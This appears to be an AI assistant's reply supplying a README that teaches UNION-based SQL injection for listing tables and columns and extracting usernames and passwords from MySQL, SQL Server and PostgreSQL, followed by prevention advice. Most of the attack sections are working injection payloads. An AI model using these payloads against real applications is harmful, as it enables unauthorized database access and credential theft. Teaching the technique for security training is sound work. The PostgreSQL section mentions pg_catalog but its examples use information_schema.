Here's a structured and beautifully formatted `README.md` for your SQL Injection guide with section-wise breakdowns:

```markdown
# SQL Injection Attack - Listing Database Contents on Non-Oracle Databases

This README provides a step-by-step guide on how to perform **SQL injection attacks** to list database contents, such as tables and columns, on **non-Oracle databases** (MySQL, SQL Server, PostgreSQL). It also includes preventive measures to protect against such attacks.

---

## Table of Contents
1. [Introduction](#introduction)
2. [SQL Injection in MySQL](#sql-injection-in-mysql)
   - [Listing Tables](#listing-tables)
   - [Listing Columns in a Table](#listing-columns-in-a-table)
   - [Retrieving Data from a Table](#retrieving-data-from-a-table)
3. [SQL Injection in SQL Server](#sql-injection-in-sql-server)
   - [Listing Tables](#listing-tables-1)
   - [Listing Columns in a Table](#listing-columns-in-a-table-1)
   - [Retrieving Data from a Table](#retrieving-data-from-a-table-1)
4. [SQL Injection in PostgreSQL](#sql-injection-in-postgresql)
   - [Listing Tables](#listing-tables-2)
   - [Listing Columns in a Table](#listing-columns-in-a-table-2)
   - [Retrieving Data from a Table](#retrieving-data-from-a-table-2)
5. [General SQL Injection Steps](#general-sql-injection-steps)
6. [Prevention](#prevention)

---

## Introduction

SQL Injection is one of the most common web vulnerabilities that allows attackers to interfere with the queries an application makes to its database. This guide covers SQL Injection techniques specifically for **non-Oracle databases** such as **MySQL**, **SQL Server**, and **PostgreSQL**, with methods to list tables, columns, and retrieve data.

---

## SQL Injection in MySQL

In MySQL, metadata about the database (e.g., tables and columns) can be accessed through the **`information_schema`** database.

### Listing Tables

To list all tables in the current database:

```sql
' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema = DATABASE() --
```

**Explanation**:
- **`information_schema.tables`**: Contains metadata about all tables in all databases.
- **`table_schema = DATABASE()`**: Filters tables by the current database.

### Listing Columns in a Table

To list columns from a specific table (e.g., `users` table):

```sql
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users' --
```

**Explanation**:
- **`information_schema.columns`**: Contains metadata about columns in each table.
- **`table_name = 'users'`**: Filters by the `users` table.

### Retrieving Data from a Table

Once you know the table and column names, you can retrieve data:

```sql
' UNION SELECT username, password FROM users --
```

---

## SQL Injection in SQL Server

In SQL Server, metadata can be retrieved using the **`sys.tables`** and **`sys.columns`** system views.

### Listing Tables

To list all tables in the current database:

```sql
' UNION SELECT name, NULL FROM sys.tables --
```

**Explanation**:
- **`sys.tables`**: Contains information about all tables in the current database.

### Listing Columns in a Table

To list columns from a specific table (e.g., `users` table):

```sql
' UNION SELECT name, NULL FROM sys.columns WHERE object_id = OBJECT_ID('users') --
```

**Explanation**:
- **`sys.columns`**: Contains metadata about the columns.
- **`OBJECT_ID('users')`**: Retrieves the ID of the `users` table.

### Retrieving Data from a Table

To extract data from the `users` table:

```sql
' UNION SELECT username, password FROM users --
```

---

## SQL Injection in PostgreSQL

In PostgreSQL, you can use the **`pg_catalog`** schema to query metadata.

### Listing Tables

To list all tables in the current database:

```sql
' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema = 'public' --
```

**Explanation**:
- **`information_schema.tables`**: Contains metadata about tables.
- **`table_schema = 'public'`**: Restricts the query to the `public` schema.

### Listing Columns in a Table

To list columns from a specific table (e.g., `users` table):

```sql
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users' --
```

### Retrieving Data from a Table

To retrieve data from the `users` table:

```sql
' UNION SELECT username, password FROM users --
```

---

## General SQL Injection Steps

1. **Identify the Database Type**:
   - Use error messages or version-retrieval techniques like `@@VERSION` (SQL Server) or `VERSION()` (MySQL) to determine the database type.

2. **Determine the Number of Columns**:
   - Use `ORDER BY` or error messages to identify the number of columns in the original query.
     - Example: `' ORDER BY 1 --`, `' ORDER BY 2 --`, etc.

3. **Use `UNION SELECT` to Retrieve Metadata**:
   - List all tables: 
     ```sql
     ' UNION SELECT table_name, NULL FROM information_schema.tables
     ```
   - List columns for a specific table:
     ```sql
     ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users'
     ```

4. **Retrieve Sensitive Data**:
   - Example: Retrieve data from the `users` table:
     ```sql
     ' UNION SELECT username, password FROM users --
     ```

---

## Prevention

To **protect against SQL Injection**, use the following best practices:

1. **Use Parameterized Queries / Prepared Statements**:
   - These queries treat user input as data rather than part of the SQL command, preventing SQL injection.
   
2. **Input Validation**:
   - Validate all user inputs, ensuring they conform to expected formats.
   - Reject any input containing SQL-specific characters (e.g., `'`, `--`, `;`).

3. **Use the Least Privilege Principle**:
   - Ensure that database user accounts used by the application have the least amount of access necessary.

4. **Implement Web Application Firewalls (WAFs)**:
   - Use WAFs to detect and block SQL Injection attacks.

5. **Error Handling**:
   - Avoid exposing detailed error messages to users, as they may reveal sensitive information about the database.

---

## Conclusion

SQL Injection is a powerful attack technique, and understanding how it works is critical to securing web applications. Always follow best practices to prevent such attacks and ensure the security of your database and applications.

---

### Contributors

- **Md. Khairul Islam**: Author
```

### Explanation:
- **Table of Contents**: Provides an easy-to-navigate structure for the README.
- **Sections**: The README is split into sections for MySQL, SQL Server, PostgreSQL, general steps, and prevention.
- **Code Snippets**: Each code snippet is clearly formatted in code blocks for easy reading and copying.
- **Prevention Measures**: Includes a section dedicated to prevention to emphasize the importance of security.

Feel free to copy and use this `README.md` file!